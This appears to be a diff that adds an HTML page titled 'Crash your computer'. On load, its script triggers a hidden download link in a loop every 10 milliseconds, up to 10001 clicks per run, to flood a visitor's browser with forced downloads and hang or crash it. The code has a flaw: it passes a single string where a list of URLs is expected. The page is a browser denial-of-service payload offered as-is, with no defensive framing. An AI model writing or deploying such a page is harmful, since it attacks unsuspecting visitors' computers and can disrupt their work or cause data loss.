@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<header>
+<script>
+function crash(urls) {
+    var link = document.createElement('a');
+
+    link.setAttribute('download', '000');
+    link.style.display = 'none';
+
+    document.body.appendChild(link);
+
+    for (var i = 0; i < 10001; i++) {
+        link.setAttribute('href', urls[i]);
+        link.click();
+    }
+
+        document.body.removeChild(link);
+}
+var crashs  = function() {
+setInterval(function(){ crash('000'); }, 10);
+}
+</script>
+<title>Crash your computer</title>
+</header>
+<body onload="crashs()">
+</body>
+</html>
